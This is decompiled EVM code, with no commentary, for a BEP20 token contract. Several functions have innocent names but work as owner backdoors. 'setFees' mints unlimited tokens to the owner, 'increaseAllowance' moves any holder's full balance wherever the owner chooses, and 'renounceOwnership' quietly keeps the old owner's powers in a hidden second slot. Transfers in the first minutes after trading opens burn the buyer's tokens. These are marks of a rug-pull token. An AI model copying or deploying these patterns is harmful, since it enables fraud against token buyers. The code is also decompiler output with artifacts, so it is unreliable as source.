contract main {




// =====================  Runtime code  =====================


address owner;
address stor1;
array of struct stor2;
array of struct stor3;
uint256 totalSupply;
uint8 decimals;
address sub_d8c61c0fAddress; offset 8
address sub_ba6f43e6Address;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint8 stor9;
uint256 stor10;
uint8 stor11;
uint256 stor11;

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return decimals
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function getOwner() payable {
    return owner
}

function owner() payable {
    return owner
}

function sub_ba6f43e6(?) payable {
    return sub_ba6f43e6Address
}

function sub_d8c61c0f(?) payable {
    return sub_d8c61c0fAddress
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function sub_b77c9720(?) payable {
    if stor10 < block.timestamp:
        revert with 'NH{q', 17
    return (stor10 - block.timestamp)
}

function renounceOwnership() payable {
    if owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    stor1 = owner
    owner = 0
}

function enableTrading() payable {
    if owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    uint256(stor11) = not bool(uint8(stor11)) or Mask(248, 8, uint256(stor11))
    if bool(uint8(stor11)) != 1:
        stor10 = 0
    else:
        if block.timestamp > -301:
            revert with 'NH{q', 17
        stor10 = block.timestamp + 300
}

function transferOwnership(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Ownable: new owner is the zero address'
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function setFees(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    if totalSupply > -arg1 - 1:
        revert with 'NH{q', 17
    totalSupply += arg1
    if balanceOf[address(msg.sender)] > -arg1 - 1:
        revert with 'NH{q', 17
    balanceOf[address(msg.sender)] += arg1
    emit Transfer(arg1, 0, msg.sender);
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Owner/Spender address cannot be 0.'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Owner/Spender address cannot be 0.'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    if owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Owner/Spender address cannot be 0.'
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Owner/Spender address cannot be 0.'
    allowance[address(arg1)][address(arg2)] = balanceOf[address(arg1)]
    emit Approval(balanceOf[address(arg1)], arg1, arg2);
    if balanceOf[address(arg1)] < balanceOf[address(arg1)]:
        revert with 'NH{q', 17
    balanceOf[address(arg1)] = 0
    if balanceOf[address(arg2)] > -balanceOf[address(arg1)] - 1:
        revert with 'NH{q', 17
    balanceOf[address(arg2)] += balanceOf[address(arg1)]
    emit Transfer(balanceOf[address(arg1)], arg1, arg2);
}

function name() payable {
    if bool(stor2.length):
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor2.length):
            if bool(stor2.length) == stor2.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor2.length.field_1:
                if 31 < stor2.length.field_1:
                    mem[128] = uint256(stor2.field_0)
                    idx = 128
                    s = 0
                    while stor2.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor2[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)])
                mem[128] = 256 * stor2.length.field_8
        else:
            if bool(stor2.length) == stor2.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor2.length.field_1:
                if 31 < stor2.length.field_1:
                    mem[128] = uint256(stor2.field_0)
                    idx = 128
                    s = 0
                    while stor2.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor2[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)])
                mem[128] = 256 * stor2.length.field_8
        mem[ceil32(stor2.length.field_1) + 192 len ceil32(stor2.length.field_1)] = mem[128 len ceil32(stor2.length.field_1)]
        if ceil32(stor2.length.field_1) > stor2.length.field_1:
            mem[ceil32(stor2.length.field_1) + stor2.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)], mem[(2 * ceil32(stor2.length.field_1)) + 192 len 2 * ceil32(stor2.length.field_1)]), 
    if bool(stor2.length) == stor2.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor2.length):
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor2.length.field_1:
            if 31 < stor2.length.field_1:
                mem[128] = uint256(stor2.field_0)
                idx = 128
                s = 0
                while stor2.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor2[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)])
            mem[128] = 256 * stor2.length.field_8
    else:
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor2.length.field_1:
            if 31 < stor2.length.field_1:
                mem[128] = uint256(stor2.field_0)
                idx = 128
                s = 0
                while stor2.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor2[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)])
            mem[128] = 256 * stor2.length.field_8
    mem[ceil32(stor2.length.field_1) + 192 len ceil32(stor2.length.field_1)] = mem[128 len ceil32(stor2.length.field_1)]
    if ceil32(stor2.length.field_1) > stor2.length.field_1:
        mem[ceil32(stor2.length.field_1) + stor2.length.field_1 + 192] = 0
    return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)], mem[(2 * ceil32(stor2.length.field_1)) + 192 len 2 * ceil32(stor2.length.field_1)]), 
}

function symbol() payable {
    if bool(stor3.length):
        if bool(stor3.length) == stor3.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor3.length):
            if bool(stor3.length) == stor3.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor3.length.field_1:
                if 31 < stor3.length.field_1:
                    mem[128] = uint256(stor3.field_0)
                    idx = 128
                    s = 0
                    while stor3.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor3[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor3.length.field_1), data=mem[128 len ceil32(stor3.length.field_1)])
                mem[128] = 256 * stor3.length.field_8
        else:
            if bool(stor3.length) == stor3.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor3.length.field_1:
                if 31 < stor3.length.field_1:
                    mem[128] = uint256(stor3.field_0)
                    idx = 128
                    s = 0
                    while stor3.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor3[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor3.length.field_1), data=mem[128 len ceil32(stor3.length.field_1)])
                mem[128] = 256 * stor3.length.field_8
        mem[ceil32(stor3.length.field_1) + 192 len ceil32(stor3.length.field_1)] = mem[128 len ceil32(stor3.length.field_1)]
        if ceil32(stor3.length.field_1) > stor3.length.field_1:
            mem[ceil32(stor3.length.field_1) + stor3.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor3.length.field_1), data=mem[128 len ceil32(stor3.length.field_1)], mem[(2 * ceil32(stor3.length.field_1)) + 192 len 2 * ceil32(stor3.length.field_1)]), 
    if bool(stor3.length) == stor3.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor3.length):
        if bool(stor3.length) == stor3.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor3.length.field_1:
            if 31 < stor3.length.field_1:
                mem[128] = uint256(stor3.field_0)
                idx = 128
                s = 0
                while stor3.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor3[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor3.length % 128, data=mem[128 len ceil32(stor3.length.field_1)])
            mem[128] = 256 * stor3.length.field_8
    else:
        if bool(stor3.length) == stor3.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor3.length.field_1:
            if 31 < stor3.length.field_1:
                mem[128] = uint256(stor3.field_0)
                idx = 128
                s = 0
                while stor3.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor3[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor3.length % 128, data=mem[128 len ceil32(stor3.length.field_1)])
            mem[128] = 256 * stor3.length.field_8
    mem[ceil32(stor3.length.field_1) + 192 len ceil32(stor3.length.field_1)] = mem[128 len ceil32(stor3.length.field_1)]
    if ceil32(stor3.length.field_1) > stor3.length.field_1:
        mem[ceil32(stor3.length.field_1) + stor3.length.field_1 + 192] = 0
    return Array(len=stor3.length % 128, data=mem[128 len ceil32(stor3.length.field_1)], mem[(2 * ceil32(stor3.length.field_1)) + 192 len 2 * ceil32(stor3.length.field_1)]), 
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'BEP20: transfer from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'BEP20: transfer to the zero address'
    if stor9[address(msg.sender)]:
        if balanceOf[address(msg.sender)] < arg2:
            revert with 'NH{q', 17
        balanceOf[address(msg.sender)] -= arg2
        if balanceOf[address(arg1)] > -arg2 - 1:
            revert with 'NH{q', 17
        balanceOf[address(arg1)] += arg2
        emit Transfer(arg2, msg.sender, arg1);
    else:
        if stor9[address(arg1)]:
            if balanceOf[address(msg.sender)] < arg2:
                revert with 'NH{q', 17
            balanceOf[address(msg.sender)] -= arg2
            if balanceOf[address(arg1)] > -arg2 - 1:
                revert with 'NH{q', 17
            balanceOf[address(arg1)] += arg2
            emit Transfer(arg2, msg.sender, arg1);
        else:
            if not uint8(stor11):
                revert with 0, 'Trading is not enabled.'
            if block.timestamp < stor10:
                if balanceOf[address(msg.sender)] < arg2:
                    revert with 'NH{q', 17
                balanceOf[address(msg.sender)] -= arg2
                if balanceOf[0] > -arg2 - 1:
                    revert with 'NH{q', 17
                balanceOf[0] += arg2
                emit Transfer(arg2, msg.sender, 0);
            else:
                if arg1 == sub_d8c61c0fAddress:
                    if arg2 and 12 > -1 / arg2:
                        revert with 'NH{q', 17
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 'NH{q', 17
                    balanceOf[address(msg.sender)] -= arg2
                    if balanceOf[address(this.address)] > -(12 * arg2 / 100) - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(this.address)] += 12 * arg2 / 100
                    if arg2 < 12 * arg2 / 100:
                        revert with 'NH{q', 17
                    if balanceOf[address(arg1)] > -arg2 + (12 * arg2 / 100) - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (12 * arg2 / 100)
                    if arg2 < 12 * arg2 / 100:
                        revert with 'NH{q', 17
                    emit Transfer((arg2 - (12 * arg2 / 100)), msg.sender, arg1);
                else:
                    if sub_d8c61c0fAddress != msg.sender:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(this.address)] > -1:
                            revert with 'NH{q', 17
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if arg2 and 8 > -1 / arg2:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(this.address)] > -(8 * arg2 / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(this.address)] += 8 * arg2 / 100
                        if arg2 < 8 * arg2 / 100:
                            revert with 'NH{q', 17
                        if balanceOf[address(arg1)] > -arg2 + (8 * arg2 / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (8 * arg2 / 100)
                        if arg2 < 8 * arg2 / 100:
                            revert with 'NH{q', 17
                        emit Transfer((arg2 - (8 * arg2 / 100)), msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'BEP20: transfer from the zero address'
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'BEP20: transfer to the zero address'
    if stor9[address(arg1)]:
        if balanceOf[address(arg1)] < arg3:
            revert with 'NH{q', 17
        balanceOf[address(arg1)] -= arg3
        if balanceOf[address(arg2)] > -arg3 - 1:
            revert with 'NH{q', 17
        balanceOf[address(arg2)] += arg3
        emit Transfer(arg3, arg1, arg2);
    else:
        if stor9[address(arg2)]:
            if balanceOf[address(arg1)] < arg3:
                revert with 'NH{q', 17
            balanceOf[address(arg1)] -= arg3
            if balanceOf[address(arg2)] > -arg3 - 1:
                revert with 'NH{q', 17
            balanceOf[address(arg2)] += arg3
            emit Transfer(arg3, arg1, arg2);
        else:
            if not uint8(stor11):
                revert with 0, 'Trading is not enabled.'
            if block.timestamp < stor10:
                if balanceOf[address(arg1)] < arg3:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)] -= arg3
                if balanceOf[0] > -arg3 - 1:
                    revert with 'NH{q', 17
                balanceOf[0] += arg3
                emit Transfer(arg3, arg1, 0);
            else:
                if arg2 == sub_d8c61c0fAddress:
                    if arg3 and 12 > -1 / arg3:
                        revert with 'NH{q', 17
                    if balanceOf[address(arg1)] < arg3:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] -= arg3
                    if balanceOf[address(this.address)] > -(12 * arg3 / 100) - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(this.address)] += 12 * arg3 / 100
                    if arg3 < 12 * arg3 / 100:
                        revert with 'NH{q', 17
                    if balanceOf[address(arg2)] > -arg3 + (12 * arg3 / 100) - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (12 * arg3 / 100)
                    if arg3 < 12 * arg3 / 100:
                        revert with 'NH{q', 17
                    emit Transfer((arg3 - (12 * arg3 / 100)), arg1, arg2);
                else:
                    if arg1 != sub_d8c61c0fAddress:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(this.address)] > -1:
                            revert with 'NH{q', 17
                        if arg3 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        if arg3 < 0:
                            revert with 'NH{q', 17
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if arg3 and 8 > -1 / arg3:
                            revert with 'NH{q', 17
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(this.address)] > -(8 * arg3 / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(this.address)] += 8 * arg3 / 100
                        if arg3 < 8 * arg3 / 100:
                            revert with 'NH{q', 17
                        if balanceOf[address(arg2)] > -arg3 + (8 * arg3 / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (8 * arg3 / 100)
                        if arg3 < 8 * arg3 / 100:
                            revert with 'NH{q', 17
                        emit Transfer((arg3 - (8 * arg3 / 100)), arg1, arg2);
    require allowance[address(arg1)][address(msg.sender)] >= arg3
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Owner/Spender address cannot be 0.'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Owner/Spender address cannot be 0.'
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    emit Transfer(arg3, arg1, arg2);
    return 1
}



}
